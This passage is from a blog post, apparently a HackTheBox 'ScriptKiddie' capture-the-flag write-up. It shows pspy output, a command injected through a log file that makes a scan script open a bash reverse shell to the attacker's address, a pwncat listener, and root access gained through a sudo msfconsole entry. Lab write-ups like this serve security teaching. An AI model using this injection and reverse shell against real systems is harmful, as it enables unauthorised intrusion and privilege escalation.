</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>host</span><span class=o>=</span><span class=s1>&#39;0.0.0.0&#39;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>So normally <code>/home/pwn/scanlosers.sh</code> will scan us back.</p><p>The logs file should contains lines like this one:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>2021-02-08 19:54:33.513581 1.1.1.1
</span></span></code></pre></td></tr></table></div></div><p>And when we try to &ldquo;hack&rdquo; searchploit, it voids the file instead of appending a
new line.</p><p>There is <code>/usr/sbin/incrond</code> running so there is maybe a root job starting
<code>/home/pwn/scanlosers.sh</code> or something similar.</p><p>Let&rsquo;s upload and launch pspy to confirm that.</p><p>On our machine:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
</span></span><span class=line><span class=cl>$ ruby -run -ehttpd . -p8080
</span></span></code></pre></td></tr></table></div></div><p>On the target machine:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>kid@scriptkiddie:~$ wget http://10.10.14.135:8080/pspy64
</span></span><span class=line><span class=cl>kid@scriptkiddie:~$ chmod u+x pspy64
</span></span><span class=line><span class=cl>kid@scriptkiddie:~$ ./pspy64
</span></span></code></pre></td></tr></table></div></div><p>If we go trigger the searchsploit security filter we can see this on pspy:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>2021/02/08 21:30:37 CMD: UID=1001 PID=2221   | /bin/bash /home/pwn/scanlosers.sh 
</span></span><span class=line><span class=cl>2021/02/08 21:30:37 CMD: UID=1001 PID=2225   | /bin/bash /home/pwn/scanlosers.sh 
</span></span><span class=line><span class=cl>2021/02/08 21:30:37 CMD: UID=1001 PID=2226   | sh -c nmap --top-ports 10 -oN recon/10.10.14.135.nmap 10.10.14.135 2&gt;&amp;1 &gt;/dev/null 
</span></span><span class=line><span class=cl>2021/02/08 21:30:37 CMD: UID=1001 PID=2228   | nmap --top-ports 10 -oN recon/10.10.14.135.nmap 10.10.14.135 
</span></span><span class=line><span class=cl>2021/02/08 21:30:37 CMD: UID=1001 PID=2231   | /bin/bash /home/pwn/scanlosers.sh 
</span></span><span class=line><span class=cl>2021/02/08 21:30:37 CMD: UID=1001 PID=2237   | /bin/bash /home/pwn/scanlosers.sh 
</span></span><span class=line><span class=cl>2021/02/08 21:30:37 CMD: UID=1001 PID=2236   | /bin/bash /home/pwn/scanlosers.sh 
</span></span><span class=line><span class=cl>2021/02/08 21:30:37 CMD: UID=0    PID=2238   | /lib/systemd/systemd-udevd 
</span></span><span class=line><span class=cl>2021/02/08 21:30:48 CMD: UID=0    PID=2239   | /usr/sbin/incrond 
</span></span><span class=line><span class=cl>2021/02/08 21:30:48 CMD: UID=1001 PID=2240   | sed -i s/open  /closed/g /home/pwn/recon/sed6xfScv 
</span></span><span class=line><span class=cl>2021/02/08 21:30:48 CMD: UID=0    PID=2241   | /bin/sh /sbin/dhclient-script 
</span></span><span class=line><span class=cl>2021/02/08 21:30:48 CMD: UID=???  PID=2243   | ???
</span></span></code></pre></td></tr></table></div></div><p>1001 is the id of <code>pwn</code>, so we&rsquo;ll get a shell as pwn.</p><p>Let&rsquo;s craft a reverse shell payload and put it in place:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>$ printf %s &#34;cyfun cyfun ;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.135/9999 0&gt;&amp;1&#39; #&#34; &gt; /home/kid/logs/hackers
</span></span></code></pre></td></tr></table></div></div><p>Note: respect the log format else the <code>cut</code> in the script will fails to parse</p><p>Once injected in <code>/home/pwn/scanlosers.sh</code> the command executed by pwn incron
job will be:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>nmap --top-ports 10 -oN recon/ ;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.135/9999 0&gt;&amp;1&#39; #.nmap  ;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.135/9999 0&gt;&amp;1&#39; # 2&gt;&amp;1 &gt;/dev/null
</span></span></code></pre></td></tr></table></div></div><p>Then we start a listener <code>pwncat -l 9999 -vv</code>.</p><h2 id=privilege-escalation-of-machine--from-pwn-to-root>Privilege Escalation of Machine : from pwn to root<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--from-pwn-to-root>#</a></h2><p>We can root <code>msfconsole</code> as root.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>pwn@scriptkiddie:~$ sudo -l
</span></span><span class=line><span class=cl>Matching Defaults entries for pwn on scriptkiddie:
</span></span><span class=line><span class=cl>    env_reset, mail_badpass,
</span></span><span class=line><span class=cl>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>User pwn may run the following commands on scriptkiddie:
</span></span><span class=line><span class=cl>    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
</span></span></code></pre></td></tr></table></div></div><p>It will be EZ because we it&rsquo;s an interpretter where we can directly pass
system commands or open <code>irb</code> ruby interpreter.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>msf6 &gt; cat /root/root.txt
</span></span><span class=line><span class=cl>stty: &#39;standard input&#39;: Inappropriate ioctl for device
</span></span><span class=line><span class=cl>[*] exec: cat /root/root.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>40aa*********************75f
</span></span></code></pre></td></tr></table></div></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/hackthebox/>Hackthebox</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/linux/>Linux</a></li><li><a href=https://s4ch.github.io/tags/easy/>Easy</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://s4ch.github.io/>CyFun</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>